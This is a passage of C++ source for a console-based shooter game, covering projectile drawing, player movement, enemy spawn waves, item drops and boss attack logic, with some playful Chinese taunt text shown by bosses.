        if(B[b].what==6||B[b].what==8||B[b].what==9){Nor;Setpos(B[b].x-1,B[b].y);if(ti(B[b].x)-1==20)cout<<"==";else cout<<"  ";Setpos(B[b].x+1,B[b].y);if(ti(B[b].x)+1==20)cout<<"==";else cout<<"  ";Setpos(B[b].x,B[b].y-1);if(ti(B[b].x)==20)cout<<"======";else cout<<"      ";if(B[b].life!=0){B[b].y-=B[b].vy;B[b].x-=B[b].vx;Setpos(B[b].x,B[b].y-1);if(B[b].what==6){if(B[b].How<=1) Color(1); else Color(6);}if(B[b].what==9){if(B[b].How<=1) Color(4); else Color(8);}if(B[b].what==8)Color(5);Setpos(B[b].x-1,B[b].y);cout<<"︹";Setpos(B[b].x+1,B[b].y);cout<<"︺";Setpos(B[b].x,B[b].y-1);if(B[b].How%2==1) cout<<"〔●〕"; else cout<<"﹝○﹞"; if(a==1) Pan(6,B[b].x,B[b].y,b);}}
        if(B[b].what==7){Nor;Setpos(B[b].x,B[b].y);if(B[b].How<0) for(int i=19;i>=20+B[b].How;i--) {Setpos(i,B[b].y);cout<<"  ";}if(B[b].How>0) for(int i=21;i<=20+B[b].How;i++) {Setpos(i,B[b].y);cout<<"  ";}if(B[b].life!=0){B[b].y-=B[b].vy;if(B[b].How<0) for(int i=19;i>=20+B[b].How;i--) {Setpos(i,B[b].y);cout<<"║"; if(a==1) Pan(7,i,B[b].y,b);}if(B[b].How>0) for(int i=21;i<=20+B[b].How;i++) {Setpos(i,B[b].y);cout<<"║"; if(a==1) Pan(7,i,B[b].y,b);}}}
        if(B[b].what==10||B[b].what==11||B[b].what==12){Nor;Setpos(B[b].x,B[b].y);if(ti(B[b].x)==20)cout<<"==";else cout<<"  ";if(B[b].life!=0){B[b].x-=B[b].vx;B[b].y-=B[b].vy;if(B[b].How==1){B[b].vy-=0.2;}else B[b].vx-=0.35;if(B[b].x>=25) B[b].x=25,B[b].vx*=-0.8;if(B[b].what==11&&B[b].y<=1) B[b].y=1,B[b].vy*=-1;if(B[b].what==12&&B[b].y<=1) B[b].y=1,B[b].vx=0,B[b].vy=-0.5,B[b].How=1;Setpos(B[b].x,B[b].y);if(B[b].what==11)Color(1);else if(B[b].what==12)Color(5);else Color(0);if(B[b].t%4<2)cout<<"▃";else cout<<"▍";if(a==1) Pan(B[b].what,B[b].x,B[b].y,b);}}
        if(B[b].what>=13&&B[b].what<=17){Nor;Setpos(B[b].x,B[b].y);if(ti(B[b].x)==20)cout<<"====";else cout<<"    ";if(B[b].life!=0){B[b].x-=B[b].vx;B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);if(B[b].what==14) Color(1);else if(B[b].what==15) Color(4);else if(B[b].what==16) Color(5);else if(B[b].what==17) Color(3);else Color(2);cout<<"●";if(B[b].what==14)cout<<"*";if(B[b].what==15)cout<<"";if(B[b].what==16)cout<<"<";if(B[b].what==17)cout<<"X";} if(a==1) Pan(1,B[b].x,B[b].y,b);}
        if(B[b].what==98&&B[b].life!=0){B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);if(ti(B[b].x==20))cout<<"==";else cout<<"  ";if(B[b].y<=3)B[b].life=0;} 
        if(B[b].what>=99){if(B[b].y<=3)B[b].life=0;if(B[b].life!=0){B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);Color(5);if(B[b].what==99)cout<<"█";if(B[b].what>=100&&B[b].what<200){if(B[b].what%5==0)cout<<"我";if(B[b].what%5==1)cout<<"是";if(B[b].what%5==2)cout<<"最";if(B[b].what%5==3)cout<<"强";if(B[b].what%5==4)cout<<"的";}if(B[b].what>=200&&B[b].what<300){if(B[b].what%6==0)cout<<"神";if(B[b].what%6==1)cout<<"级";if(B[b].what%6==2)cout<<"怪";if(B[b].what%6==3)cout<<"物";if(B[b].what%6==4)cout<<"之";if(B[b].what%6==5)cout<<"光";}if(B[b].what>=300&&B[b].what<400){if(B[b].what%8==0)cout<<"颤";if(B[b].what%8==1)cout<<"抖";if(B[b].what%8==2)cout<<"吧";if(B[b].what%8==3)cout<<"无";if(B[b].what%8==4)cout<<"能";if(B[b].what%8==5)cout<<"的";if(B[b].what%8==6)cout<<"人";if(B[b].what%8==7)cout<<"类";}if(B[b].what>=400&&B[b].what<500){if(B[b].what%8==0)cout<<"还";if(B[b].what%8==1)cout<<"不";if(B[b].what%8==2)cout<<"快";if(B[b].what%8==3)cout<<"跪";if(B[b].what%8==4)cout<<"倒";if(B[b].what%8==5)cout<<"在";if(B[b].what%8==6)cout<<"朕";if(B[b].what%8==7)cout<<"前";}if(B[b].what>=500&&B[b].what<600){if(B[b].what%8==0)cout<<"看";if(B[b].what%8==1)cout<<"懂";if(B[b].what%8==2)cout<<"这";if(B[b].what%8==3)cout<<"句";if(B[b].what%8==4)cout<<"话";if(B[b].what%8==5)cout<<"的";if(B[b].what%8==6)cout<<"是";if(B[b].what%8==7)cout<<"猪";} if(a==1) Pan(1,B[b].x,B[b].y,b);}}
        if(B[b].what==-1){Nor;Setpos(B[b].x,B[b].y);if(ti(B[b].x)==20)cout<<"==";else cout<<"  ";if(Boss==0) B[b].life=0;else if(((Boss==1&&abs(B[b].x-Bx1)+abs(B[b].y-By1)<1.5)||(Boss==2&&abs(B[b].x-Bx2)+abs(B[b].y-By2)<1.5)||(Boss==3&&abs(B[b].x-Bx3)+abs(B[b].y-By3)<1.5)||(B[b].t==10))&&B[b].life==1) Bblo-=8+Lv*2,B[b].life=0;if(B[b].life!=0){if(Boss==1)B[b].x=B[b].x+(Bx1-B[b].x)/(10-B[b].t)*1.0,B[b].y=B[b].y+(By1-B[b].y)/(10-B[b].t)*1.0;if(Boss==2)B[b].x=B[b].x+(Bx2-B[b].x)/(10-B[b].t)*1.0,B[b].y=B[b].y+(By2-B[b].y)/(10-B[b].t)*1.0;if(Boss==3)B[b].x=B[b].x+(Bx3-B[b].x)/(10-B[b].t)*1.0,B[b].y=B[b].y+(By3-B[b].y)/(10-B[b].t)*1.0;Setpos(B[b].x,B[b].y);Color(7);if(B[b].t%2==0) cout<<"＋";else cout<<"×";}}
        if(B[b].what<=-2&&B[b].what>=-9){Nor;Setpos(B[b].x-1,B[b].y);if(ti(B[b].x)-1==20)cout<<"==";else cout<<"  ";Setpos(B[b].x+1,B[b].y);if(ti(B[b].x)+1==20)cout<<"==";else cout<<"  ";Setpos(B[b].x,B[b].y-1);if(ti(B[b].x)==20)cout<<"======";else cout<<"      ";if(B[b].life!=0){B[b].y-=B[b].vy;B[b].x-=B[b].vx;if(B[b].what<=-3&&B[b].what>=-7){if(B[b].x<=7)B[b].x=7;if(B[b].x>=28)B[b].x=28;else if(B[b].x>=B[b].a+1&&B[b].How==1)B[b].How=0;else if(B[b].x<=B[b].a-1&&B[b].How==0)B[b].How=1;if(B[b].How==1&&B[b].vx>=-1)B[b].vx-=0.2;if(B[b].How==0&&B[b].vx<=1)B[b].vx+=0.2;}if(B[b].what==-2) Color(3);if(B[b].what==-3) Color(4);if(B[b].what==-4) Color(1);if(B[b].what==-5) Color(0);if(B[b].what==-6) Color(6);if(B[b].what==-7) Color(5);if(B[b].what==-8) Color(2);if(B[b].what==-9) Color(14);if(T%7<=1&&B[b].what==-5)Color(1);else if(T%7<=1)Color(0);Setpos(B[b].x-1,B[b].y);cout<<"︹";Setpos(B[b].x+1,B[b].y);cout<<"︺";Setpos(B[b].x,B[b].y-1);if(B[b].what==-2) cout<<"﹝镖﹞";if(B[b].what==-3) cout<<"﹝火﹞";if(B[b].what==-4) cout<<"﹝水﹞";if(B[b].what==-5) cout<<"﹝风﹞";if(B[b].what==-6) cout<<"﹝雷﹞";if(B[b].what==-7) cout<<"﹝磁﹞";if(B[b].what==-8) cout<<"﹝血﹞";if(B[b].what==-9) cout<<"﹝忍﹞"; if(a==1) Pan(-2,B[b].x,B[b].y,b);}}
        if(B[b].what==-11||B[b].what==-12){Nor;Setpos(B[b].x,B[b].y);if(ti(B[b].x)==20)cout<<"==";else cout<<"  ";if(B[b].life!=0){if(Magne>0)B[b].How++,B[b].x=B[b].x+(X-B[b].x)/(10-B[b].How)*1.0,B[b].y=B[b].y+(Y-B[b].y)/(10-B[b].How)*1.0;B[b].y-=B[b].vy;Setpos(B[b].x,B[b].y);if(B[b].what==-10) Color(5);if(B[b].what==-11) Color(7);if(T%7<=1)Color(0);cout<<"◆"; if(a==1) Pan(-1,B[b].x,B[b].y,b);}}
        if(B[b].what==-13){Nor;Setpos(B[b].x,B[b].y-0.5);if(ti(B[b].x)==20)cout<<"===";else cout<<"   ";if(B[b].life!=0){if(B[b].a==13880086){if(Boss==0) B[b].life=0;else if(((Boss==1&&abs(B[b].x-Bx1)+abs(B[b].y-By1)<1.5)||(Boss==2&&abs(B[b].x-Bx2)+abs(B[b].y-By2)<1.5)||(Boss==3&&abs(B[b].x-Bx3)+abs(B[b].y-By3)<1.5)||(B[b].t==5))&&B[b].life==1) Bblo-=8+Lv*2,B[b].life=0;if(B[b].life!=0){if(Boss==1)B[b].x=B[b].x+(Bx1-B[b].x)/(5-B[b].t)*1.0,B[b].y=B[b].y+(By1-B[b].y)/(5-B[b].t)*1.0;if(Boss==2)B[b].x=B[b].x+(Bx2-B[b].x)/(5-B[b].t)*1.0,B[b].y=B[b].y+(By2-B[b].y)/(5-B[b].t)*1.0;if(Boss==3)B[b].x=B[b].x+(Bx3-B[b].x)/(5-B[b].t)*1.0,B[b].y=B[b].y+(By3-B[b].y)/(5-B[b].t)*1.0;}}else{if(B[B[b].a].life==0) B[b].life=0;else if((abs(B[b].x-B[B[b].a].x)+abs(B[b].y-B[B[b].a].y)<1.5||(B[b].t==5))&&B[b].life==1) Exp+=2,B[B[b].a].life=B[b].life=0;if(B[b].life!=0){B[b].x=B[b].x+(B[B[b].a].x-B[b].x)/(5-B[b].t)*1.0,B[b].y=B[b].y+(B[B[b].a].y-B[b].y)/(5-B[b].t)*1.0;}}Setpos(B[b].x,B[b].y-0.5);if(T%6<3)Color(5);else Color(4);cout<<"●";}}
    }if(br<bl) {br=-1,bl=0;memset(B,0,sizeof(B));}Color(0);
}
void Move(){
    if(X<3) X=3;if(Y<1) Y=1,Vy=0;if(Y>29) Y=29,Vy=0;
    if(Ice!=0){X-=Vx/2.0;Y+=Vy/2.0;Vy=fmax(Vy-0.025,(float)0);if(T%6==0&&Up==0&&Y<Ding) Y+=0.25;if(T%6==3&&Up==0&&Y>=Ding) Y-=0.25;if(Up==0&&Y<=Ding-1.25) Vy=0.25;if(Up==0&&Y>=Ding+1.25&&Wind==0) Vy=-0.25;if(Up==0&&Down==0&&Vx>0&&X<=18) Up=0,Down=0,Vx=0,Vy=0,X=18,Setpos(20,Y-2.5),cout<<"==========";else if(Down==2&&X<=22) Up=0,Down=1,Vx=0,Vy=0,X=22,Setpos(20,Y-2.5),cout<<"==========";else if(Up==0&&Down==1&&Vx<0&&X>=22) Up=0,Down=1,Vx=0,Vy=0,X=22,Setpos(20,Y-2.5),cout<<"==========";else if(Up>0&&Down==0&&X>18) Up=0,Vx=0,Vy=0,X=18,Setpos(20,Y-2.5),cout<<"==========";else if(Down==2) Vx+=0.175;else if(Up>0&&Upt==0) Vx-=0.175;else if(Up>0&&Upt>0) {Vx=fmax(Vx-0.125,(float)0);if(Upt==1&&T%2==0)Map(-1,0);if(T%2==0)Upt--;}}
    else{X-=Vx;Y+=Vy;Vy=fmax(Vy-0.05,(float)0);if(Wind==0){if(T%6==0&&Up==0&&Y<Ding) Y+=0.5;if(T%6==3&&Up==0&&Y>=Ding) Y-=0.5;}else{if(T%2==0&&Up==0&&Y<Ding) Y+=0.5;if(T%2==1&&Up==0&&Y>=Ding) Y-=0.5;}if(Up==0&&Y<=Ding-1.25) Vy=0.5;if(Up==0&&Y>=Ding+1.25&&Wind==0) Vy=-0.5;if(Up==0&&Down==0&&Vx>0&&X<=18) Up=0,Down=0,Vx=0,Vy=0,X=18,Setpos(20,Y-2.5),cout<<"==========";else if(Down==2&&X<=22) Up=0,Down=1,Vx=0,Vy=0,X=22,Setpos(20,Y-2.5),cout<<"==========";else if(Up==0&&Down==1&&Vx<0&&X>=22) Up=0,Down=1,Vx=0,Vy=0,X=22,Setpos(20,Y-2.5),cout<<"==========";else if(Up>0&&Down==0&&X>18) Up=0,Vx=0,Vy=0,X=18,Setpos(20,Y-2.5),cout<<"==========";else if(Down==2) Vx+=0.35;else if(Up>0&&Upt==0) Vx-=0.35;else if(Up>0&&Upt>0) {Vx=fmax(Vx-0.25,(float)0);if(Upt==1)Map(-1,0); Upt--;}}
    for(int i=bl;i<=br;i++){
        if(B[i].what<98)if(B[i].x-B[i].vx<=5||B[i].x-B[i].vx>=30||B[i].y-B[i].vy<=0||B[i].y-B[i].vy>=30){B[i].life=0;Map(1,i);}
        for(int j=0;j<20;j++)if(B[i].what>0&&B[i].life!=0&&abs(B[i].x-I[j][0])<2&&B[i].y-I[j][1]<=2){Setpos(I[j][0],I[j][1]);if(I[j][0]==20) cout<<"===";else cout<<"   ";I[j][0]=I[j][1]=-1;B[i].life=0;Exp+=2;}
        if(B[i].t>=100)B[i].life=0;if(B[i].life==0&&i==bl) bl++;
        Map(1,i);if(B[i].life==0) continue;
        else{B[i].t++;
            if(B[i].what==1){if(B[i].y<=25&&B[i].How==0) B[i].vy=0,B[i].How=1;if(B[i].t==30) B[i].y+=1.5,B[i].How=2;if(B[i].t==35) B[i].vy=1.5,B[i].How=3;}
            if(B[i].what==2){if(B[i].t%3==0) B[i].How=!B[i].How;} 
            if(B[i].what==3||B[i].what==5){if(B[i].what==3&&B[i].y<=20) B[i].vy=0;if(B[i].what==5&&B[i].y<=21) B[i].vy=0;if(B[i].t>30&&B[i].t%2==0) B[i].How=!B[i].How;if(B[i].what==5&&B[i].t<=30&&B[i].x<X) B[i].vx=-0.2;else if(B[i].what==5&&B[i].t<=70&&B[i].x>X) B[i].vx=0.2;else B[i].vx=0;if(B[i].t==45){B[i].life=0;br++;B[br].what=4;B[br].x=B[i].x;B[br].y=32;B[br].vy=3;B[br].life=1;}}
            if(B[i].what==6||B[i].what==8||B[i].what==9){if(B[i].vx<0.25&&B[i].vy<0.25&&B[i].t>=50){B[i].life=0;if(B[i].life==0&&i==bl) bl++;Map(1,i);break;}if(B[i].t%5==0) B[i].How=rand()%4;if(B[i].what==9){if(B[i].t==7){X9:float xx=(rand()%41)/40.0,yy=(rand()%41)/40.0;if(xx<=0.5&&yy<=0.5) goto X9;for(int j=1;j<=4;j++){br++,B[br].what=9;B[br].t=11;B[br].x=B[i].x,B[br].y=B[i].y,B[br].vx=xx,B[br].vy=yy;if(j%2==0)swap(B[br].vx,B[br].vy),B[br].vy*=-1;if(j<=2)B[br].vx*=-1,B[br].vy*=-1;B[br].life=1;}B[i].life=0;}}if(B[i].what==8){if(B[i].x>X&&B[i].vx<1.2) B[i].vx+=fmax((float)0,0.2-B[i].t/25);if(B[i].x<X&&B[i].vx>-1.2) B[i].vx-=fmax((float)0,0.2-B[i].t/25);if(B[i].y>Y&&B[i].vy<1.2) B[i].vy+=fmax((float)0,0.2-B[i].t/25);if(B[i].y<Y&&B[i].vy>-1.2) B[i].vy-=fmax((float)0,0.2-B[i].t/25);}}
            if(B[i].what>=13&&B[i].what<=15&&B[i].How!=0){if(B[i].x==B[i].How)B[i].vx=0,B[i].How=0;}
            if(B[i].what==16){if(B[i].x<X&&B[i].vx>=-1) B[i].vx-=0.2;else if(B[i].x>X&&B[i].vx<=1) B[i].vx+=0.2;}
        }
        if(B[i].life==1&&B[i].a==0&&B[i].what>0){if(B[i].y>Y&&abs(B[i].x-X)<=3&&((B[i].x-X)*(B[i].x-X)+(B[i].y-Y)*(B[i].y-Y))<Dis) Dis=(B[i].x-X)*(B[i].x-X)+(B[i].y-Y)*(B[i].y-Y),Disb=i;else if(((B[i].x-X)*(B[i].x-X)+(B[i].y-Y)*(B[i].y-Y))<Dis1) Dis1=(B[i].x-X)*(B[i].x-X)+(B[i].y-Y)*(B[i].y-Y),Disb1=i;}
    }
}
void Guai(int R,int r){
    if(R==-1){br++;B[br].what=-1;B[br].x=X+rand()%3-1;B[br].y=Y+rand()%3-1;B[br].life=1;}
    if(R<=-2&&R>=-11){br++;B[br].what=R;B[br].x=B[br].a=r;B[br].y=29;if(R<=-3&&R>=-7)B[br].vx=-1;B[br].vy=1;B[br].life=1;}
    if(R==0){br++;B[br].what=1;B[br].x=r;B[br].y=29;B[br].vy=1;B[br].life=1;}
    if(R==1){br++;B[br].what=2;B[br].x=r;B[br].y=29;B[br].vy=1;B[br].life=1;}
    if(R==2||R==3){br++;B[br].what=2*R-1;B[br].x=r;B[br].y=29;B[br].vy=1;B[br].life=1;}
    if(R==4){br++;B[br].what=6;if(r<5)r=5;if(r>30)r=30;B[br].x=r;if(r==11||r==25) B[br].y=29-(rand()%20);else B[br].y=29;X4:B[br].vx=(rand()%21-10)/30.0;B[br].vy=(rand()%25)/30.0;if(B[br].vx<=0.8&&B[br].vy<=0.8)goto X4;int rx=rand()%50;if(rx==0) B[br].vx=0;B[br].life=1;}
    if(R==5){br++;B[br].How=r;B[br].what=7;if(B[br].How<0) B[br].x=19;if(B[br].How>0) B[br].x=21;B[br].y=29;B[br].vy=1;B[br].life=1;}
}
void CpGuai(int R,float x,float y,float xx,float yy){
    if(R==4){br++;B[br].what=6;B[br].x=x;B[br].y=y;B[br].vx=xx;B[br].vy=yy;B[br].life=1;}
    if(R==6||R==7||R==8){br++;B[br].what=4+R;B[br].x=x;B[br].y=y;B[br].vx=xx;B[br].vy=yy;B[br].life=1;}
}
void MesGuai(int a,int rr){
    int R=rand()%rr,r=-10086;
    if(R==0){if(a==1) r=(5+rand()%8)*2;if(a<=3&&a!=1) r=10+rand()%16;if(a==4) r=rand()%75-20;if(a==5) r=2+rand()%4;if(r!=-10086) Guai(a,r);}
}
void NorGuai(int a,int b){    
    if(a==1) {if(b==1||b==41) Guai(0,15),Guai(0,17),Guai(0,19);if(b==21||b==61) Guai(0,21),Guai(0,23),Guai(0,25);if(b==81) Guai(0,11),Guai(0,13),Guai(0,15),Guai(0,17),Guai(0,19);if(b==101||b==141) Guai(0,17),Guai(0,19),Guai(0,21),Guai(0,23),Guai(0,25);if(b==121) Guai(0,15),Guai(0,17),Guai(0,19),Guai(0,21),Guai(0,23);if(b>=160&&b<=260&&b%10==0) Guai(0,b/10-1);if(b>=270&&b<=370&&b%10==0) Guai(0,52-b/10);if(b>=460&&b<=560&&b%10==0) Guai(0,b/10-37),Guai(0,b/10-36),Guai(0,b/10-35);if(b>=570&&b<=670&&b%10==0) Guai(0,78-b/10),Guai(0,77-b/10),Guai(0,76-b/10);if(b>=760&&b<=960&&b%10==0) Guai(0,b/10-66),Guai(0,b/10-65),Guai(0,103-b/10),Guai(0,104-b/10);if(b>=1000&&b<=1300) MesGuai(0,30-b/50);}
    if(a==2) {if(b<=200&&b%30==1) {int r=rand()%4;if(r==1) r=0;for(int i=0;i<4;i++) if(i!=r) Guai(1,i*4+9);}if(b>200&&b<=220&&b%5==1) Guai(1,18);if(b>220&&b<=300&&b%7==1) Guai(1,b/5-26);if(b>350&&b<=370&&b%5==1) Guai(1,22);if(b>370&&b<=450&&b%7==1) Guai(1,96-b/5);if(b==461||b==501||b==541) Guai(1,13),Guai(1,17),Guai(1,21);if(b==481||b==521||b==561) Guai(1,17),Guai(1,21),Guai(1,25);if(b>=561&&b<=861&&b%20==1) Guai(1,b/40+5);if(b>=561&&b<=861&&b%20==11) Guai(1,35-b/40);if(b>=801&&b<=961&&b%15==1) Guai(1,20);if(b>=1000&&b<=1300) MesGuai(1,30-b/50);}
    if(a==3) {if(b==1||b==61) Guai(3,15),Guai(2,17),Guai(2,19);if(b==31||b==91) Guai(2,21),Guai(2,23),Guai(3,25);if(b>=120&&b<=220&&b%10==0) Guai(2,b/10+3);if(b>=240&&b<=340&&b%10==0) Guai(2,49-b/10);if(b>=360&&b<=460&&b%20==0) Guai(2,b/10-21),Guai(2,61-b/10);if(b>=480&&b<=580&&b%20==0) Guai(3,b/10-33),Guai(3,73-b/10);if(b>=600&&b<750&&b%30==0) {for(int i=0;i<5;i++) Guai(3,i*3+10);}if(b>=750&&b<830&&b%10==0) if(b<=200&&b%40==1) Guai(2,X);if(b>=830&&b<910&&b%20==0) Guai(2,X);if(b>=910&&b<980&&b%10==0) Guai(2,X);if(b>=1000&&b<=1300) MesGuai(rand()%2+2,40-b/50);}
    if(a==4) {if(b==1) CpGuai(4,10,29,-0.4,0.7),CpGuai(4,14,29,-0.2,0.7),CpGuai(4,21,29,0,0.65);if(b==41) CpGuai(4,10,29,-0.2,0.7),CpGuai(4,14,29,-0.1,0.7),CpGuai(4,18,29,0,0.65);if(b==81) CpGuai(4,5,20,-0.4,0.35),CpGuai(4,10,29,-0.4,0.7),CpGuai(4,14,29,-0.2,0.7),CpGuai(4,30,20,0.25,0.4),CpGuai(4,21,29,0,0.65);if(b==121) CpGuai(4,5,20,-0.2,0.35),CpGuai(4,10,29,-0.2,0.7),CpGuai(4,14,29,-0.1,0.7),CpGuai(4,30,20,0.4,0.4),CpGuai(4,18,29,0,0.65);if(b==161) CpGuai(4,10,29,-0.4,0.7),CpGuai(4,14,29,-0.2,0.7),CpGuai(4,21,29,0,0.6),CpGuai(4,10,29,-0.2,0.7),CpGuai(4,14,29,-0.1,0.7),CpGuai(4,18,29,0,0.65);if(b>=200&&b<=500&&b%40==1) {float r=0,rr;for(int i=1;i<=5;i++){X5:rr=0.7+(rand()%5)/10.0;if(rr==r)goto X5;r=rr;CpGuai(4,i*3+7,29,0,0.5+(rand()%50)/80.0);}}if(b>540&&b<=565&&b%5==1) CpGuai(4,5,8,-2,0.2);if(b>590&&b<=615&&b%5==1) CpGuai(4,30,8,1.5,0.2);if(b>640&&b<=665&&b%5==1) CpGuai(4,5,8,-1.5,0.3);if(b>690&&b<=715&&b%5==1) CpGuai(4,30,8,2,0.3);if(b>=750&&b<=950&&b%20==1) {float r=0,rr;for(int i=1;i<=3;i++){X6:rr=0.7+(rand()%5)/10.0;if(rr==r)goto X6;r=rr;CpGuai(4,i*5+7+(rand()%3),29,0,0.5+(rand()%50)/200.0);}}if(b>=1000&&b<=1300) MesGuai(4,5);}
}
void RandGood(){
    if(Biao>0){Biao--;Guai(-1,0);}
    if(Gd[1]==0){Gd[1]=rand()%1000+1;if(Win==7)Gd[1]=10086;Gd[3]=rand()%16+8;}
    else if(Gd[1]<=5){Guai(-2-Gd[1],Gd[3]);memset(Gd,0,sizeof(Gd));}
    else if(Gd[1]>=20&&Gd[1]<27){Guai(-8,Gd[3]);memset(Gd,0,sizeof(Gd));}
    else if(Gd[1]>=30&&Gd[1]<37){Guai(-9,Gd[3]);memset(Gd,0,sizeof(Gd));}
    else if(Gd[1]>=40&&Gd[1]<70){Gd[2]++;if(Gd[2]%2==1)Guai(-10,Gd[3]);if(Gd[2]>=9)memset(Gd,0,sizeof(Gd));}
    else if(Gd[1]>=70&&Gd[1]<100){Gd[2]++;if(Gd[2]%2==1)Guai(-11,Gd[3]);if(Gd[2]>=9)memset(Gd,0,sizeof(Gd));}
    else if(Boss!=0&&Gd[1]>=450&&Gd[1]<=500){Guai(-2,Gd[3]);memset(Gd,0,sizeof(Gd));}
    else Gd[1]=0;
    for(int i=0;i<20;i++){if(I[i][0]==-1) continue;Setpos(I[i][0],I[i][1]);Color(0);if(I[i][0]==20) cout<<"===";else cout<<"   ";I[i][1]++;if(I[i][0]>=28||I[i][0]<=0||I[i][1]>=29) I[i][0]=I[i][1]=-1;else Color(1),Setpos(I[i][0],I[i][1]),cout<<"■";Color(0);}
}
void Panboss(int bx,int by){
    float Nox[4],Noy[4];Nox[0]=X,Noy[0]=Y;
    if(Down==1&&X==22) Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=X-1,Noy[2]=Y-0.5;
    else if(Down==2) Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=-10,Noy[2]=-10;
    else if(Down==1||X<18) Nox[1]=X-1,Noy[1]=Y-0.5,Nox[2]=-10,Noy[2]=-10;
    else Nox[1]=X+1,Noy[1]=Y-0.5,Nox[2]=X-1,Noy[2]=Y-0.5;
    for(int i=0;i<3;i++){if((Boss==1||Boss==6)&&Wind==0&&Thun==0&&abs(Nox[i]-bx)<1&&abs(Noy[i]-by)<1&&Bgo1[4]==0) Blo-=20,Bgo1[4]=1,Killb=20,Kill=1;if((Boss==2||Boss==6)&&Wind==0&&Thun==0&&abs(Nox[i]-bx)<1&&abs(Noy[i]-by)<1&&Bgo2[8]==0) Blo-=20,Bgo2[8]=1,Killb=20,Kill=1;}
}
void Boss1(){
    for(int j=0;j<20;j++)if(abs(Bx1-I[j][0])<2&&By1-I[j][1]<=2){Setpos(I[j][0],I[j][1]);if(I[j][0]==20) cout<<"===";else cout<<"   ";I[j][0]=I[j][1]=-1;Bblo-=8+Lv*2;Exp+=2;}
    if(Bbr==Bbl&&Bbr!=0) Bbr=Bbl=0;
    for(int i=1;i<=3+(Bbl-Bbr)/5;i++)if(Bbr<Bbl){Setpos(Bway[Bbr][0],Bway[Bbr][1]);if(Bway[Bbr][0]==20) cout<<"==";else cout<<"  ";Bbr++;}
    if(Bwhat1==5){int bx,by;Color(5);for(int i=0;i<10;i++){bx=Bx1-i*Bvx1/10.0;by=By1-i*Bvy1/10.0;Setpos(bx,by),cout<<"█";Bbl++;Bway[Bbl][0]=bx;Bway[Bbl][1]=by;}Color(0);}
    Bx1-=Bvx1;By1-=Bvy1;
    if(Bwhat1==0){X2:Bwhat1=rand()%7;if(Bwhat1==2||Bwhat1==3){if(By1<=10||By1>25) goto X2;}if(Bwhat1==4){if(By1<=15||Bx1<20) goto X2;Bgo1[2]=Bx1;Bgo1[3]=By1-1;}if(Bwhat1==5) {X0:Bgo1[3]=rand()%4+1;Bvx1=(rand()%101)/20.0;Bvy1=(rand()%101)/20.0;if(Bgo1[3]<=2) Bvx1*=-1;if(Bgo1[3]%2==1) Bvy1*=-1;if(abs(Bvx1)+abs(Bvy1)<=3||Out1)goto X0;}if(Bwhat1==6){if(By1<=17||By1>25) goto X2;}}
    if(Bwhat1==1){Bgo1[1]++,Bgo1[2]++;int R=rand()%(5-Bgo1[1]),r=rand()%(10-Bgo1[2]);if(Out1) R=0;if(R==0) {int vx=Bvx1,vy=Bvy1;Bgo1[1]=0;Bvx1=(rand()%101-20)/50.0;Bvy1=(rand()%101-20)/50.0;if(Bgo1[3]<=2) Bvx1*=-1;if(Bgo1[3]%2==1) Bvy1*=-1;if(Out1) r=0;} if(r==0) Chang1 }
    if(Bwhat1==2){Bgo1[1]++;if(Bgo1[1]>6){Bvy1=-0.3;br++;B[br].x=Bx1,B[br].y=By1-1;B[br].what=6;X3:B[br].vx=(rand()%21-10)/40.0;B[br].vy=(rand()%25)/30.0;if(B[br].vx<=0.8&&B[br].vy<=0.8)goto X3;int rx=rand()%50;if(rx==0) B[br].vx=0;B[br].life=1;}if(Bgo1[1]>8) Chang1}
    if(Bwhat1==3){Bgo1[1]++;if(Bgo1[1]>6&&Bgo1[1]%3==0){Bvy1=-0.3;br++;B[br].x=Bx1,B[br].y=By1-1;B[br].what=8;B[br].life=1;}if(Bgo1[1]>15) Chang1}
    if(Bwhat1==4){Bgo1[1]++;if(Bgo1[1]<=8){Setpos(Bgo1[2],Bgo1[3]);if(Bgo1[1]==1)cout<<" ";else if(Bgo1[1]>1&&Bgo1[2]==20) cout<<"==";else cout<<"  ";Bgo1[2]--;Setpos(Bgo1[2],Bgo1[3]);int r=rand()%4;if(r%2==0) Color(6);else Color(9);if(r<2) cout<<") ";else cout<<"】";Color(0);}if(Bgo1[1]==6) Bgo1[5]=X,Bgo1[6]=Y;if(Bgo1[1]==11){Map(0,(bool)Kill);Setpos(Bgo1[5],Bgo1[6]+1),cout<<"  ";Setpos(Bgo1[5],Bgo1[6]-1),cout<<"  ";Setpos(Bgo1[5]+1,Bgo1[6]),cout<<"  ";Setpos(Bgo1[5]-1,Bgo1[6]),cout<<"  ";int bx,by,bvx=Bgo1[2]-Bgo1[5],bvy=Bgo1[3]-Bgo1[6];Color(6);int i=0;while(1){bx=Bgo1[2]-i*bvx/30.0;by=Bgo1[3]-i*bvy/30.0;if(bx<=5||bx>=30||by<0||by>=29) break;Panboss(bx,by);Setpos(bx,by),cout<<"█";Bbl++;Bway[Bbl][0]=bx;Bway[Bbl][1]=by;i++;}Color(0);Map(-1,0);Chang1}}
    if(Bwhat1==5){Bgo1[1]++,Bgo1[2]++;int R=rand()%(5-Bgo1[1]),r=rand()%(10-Bgo1[2]);if(Out1) R=0;if(R==0) {int vx=Bvx1,vy=Bvy1;Bgo1[1]=0;X1:Bvx1=(rand()%101-20)/20.0;Bvy1=(rand()%101-20)/20.0;if(Bgo1[3]<=2) Bvx1*=-1;if(Bgo1[3]%2==1) Bvy1*=-1;if(abs(Bvx1)+abs(Bvy1)<=3||abs(Bvx1-vx)<=1||abs(Bvy1-vy)<=1)goto X1;if(Out1) r=0;} if(r==0) Chang1 }
    if(Bwhat1==6){Bgo1[1]++;if(Bgo1[1]>6&&Bgo1[1]%10==0){By1-=1;br++;B[br].x=Bx1,B[br].y=By1-1;B[br].what=9;X30:B[br].vy=1;B[br].life=1;}if(Bgo1[1]>31) Chang1}
}
void Boss2(){
    for(int j=0;j<20;j++)if(abs(Bx2-I[j][0])<2&&By2-I[j][1]<=2){Setpos(I[j][0],I[j][1]);if(I[j][0]==20) cout<<"===";else cout<<"   ";I[j][0]=I[j][1]=-1;Bblo-=8+Lv*2;Exp+=2;}
    if(Bbr==Bbl&&Bbr!=0) Bbr=Bbl=0;
